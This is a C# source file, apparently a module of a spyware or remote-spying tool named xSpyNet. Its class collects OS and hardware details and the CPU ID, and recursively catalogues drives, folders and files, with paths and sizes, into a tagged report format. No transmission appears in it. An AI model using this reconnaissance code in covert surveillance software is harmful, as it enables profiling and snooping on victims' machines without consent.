using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

// Drive
using System.IO;
// CPU ID
using System.Management;

namespace xSpyNet
{
    class ComputerInfo
    {
        // Info Get : Caption | Manufacturer | Model
        public string GetPcInfo(string strInfoGet = "Caption")
        {
            string strTable = "Win32_OperatingSystem";
            if (strInfoGet.ToLower() == "manufacturer" || strInfoGet.ToLower() == "model")
            {
                strTable = "Win32_ComputerSystem";
            }
            string result = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT " + strInfoGet + " FROM " + strTable);
            foreach (ManagementObject os in searcher.Get())
            {
                result = os[strInfoGet].ToString();
                break;
            }
            return result;
        } 
        public static string getCPUID()
        {
	        String cpuid = "";
	        try
	        {
		        ManagementObjectSearcher mbs = new ManagementObjectSearcher("Select ProcessorID From Win32_processor");
		        ManagementObjectCollection mbsList = mbs.Get();
 
		        foreach (ManagementObject mo in mbsList)
		        {
			        cpuid = mo["ProcessorID"].ToString();
		        }
		        return cpuid;
	        }
	        catch (Exception) { return cpuid; }
        }

        public string GetDirFileFromDrive(DriveInfo myLink, int NumBrowseDir = 0)
        {
            string strDirFile = "";
            try
            {
                strDirFile += "<#Drive><#DriveName>" + myLink.ToString() + " - " + myLink.VolumeLabel + "</#DriveName>" + Environment.NewLine;
                foreach (DirectoryInfo dirInfo in myLink.RootDirectory.GetDirectories())
                {
                    strDirFile += "\t<#DirItem>" + dirInfo.ToString() + "</#DirItem>" + Environment.NewLine;
                    strDirFile += GetDirFile(dirInfo, NumBrowseDir - 1);
                }
                foreach (FileInfo fileInfo in myLink.RootDirectory.GetFiles())
                    strDirFile += "\t<#FileItem>" + fileInfo.ToString() + " | " + Main.SizeSuffix(fileInfo.Length) + " | " + fileInfo.FullName + "</#FileItem>" + Environment.NewLine;
                strDirFile += "</#Drive>" + Environment.NewLine;
            }
            catch
            {
                strDirFile += "<#Drive><#DriveName>" + myLink.ToString() + " - " + myLink.DriveType + "</#DriveName></#Drive>" + Environment.NewLine;
            }
            return strDirFile;
        }
        public string GetDirFile(DirectoryInfo strLink, int NumBrowseDir = 0)
        {
            if (NumBrowseDir < 0)
                return "";
            string strDirFile = "";
            try
            {
                string TabString = "";
                for (int i = 0; i <= NumBrowseDir; i++)
                    TabString += "\t";
                string TabString2 = "";
                for (int i = 0; i <= NumBrowseDir + 1; i++)
                    TabString2 += "\t";
                strDirFile += TabString + "<#DirTree><#DirTreeName>" + strLink.ToString() + " - " + strLink.FullName + "</#DirTreeName>" + Environment.NewLine;
                foreach (DirectoryInfo dirInfo in strLink.GetDirectories())
                {
                    strDirFile += TabString2 + "<#DirItem>" + dirInfo.ToString() + "</#DirItem>" + Environment.NewLine;
                    strDirFile += GetDirFile(dirInfo, NumBrowseDir - 1);
                }
                foreach (FileInfo fileInfo in strLink.GetFiles())
                    strDirFile += TabString2 + "<#FileItem>" + fileInfo.ToString() + " | " + Main.SizeSuffix(fileInfo.Length) + " | " + fileInfo.FullName + "</#FileItem>" + "</#FileItem>" + Environment.NewLine;
                strDirFile += TabString + "</#DirTree>" + Environment.NewLine;
            }
            catch
            {
                strDirFile += "<#DirTree><#DirTreeName>" + strLink.ToString() + " - " + strLink.Name + " Fail to View</#DirTreeName></#DirTree>" + Environment.NewLine;
            }
            return strDirFile;
        }
    }
}
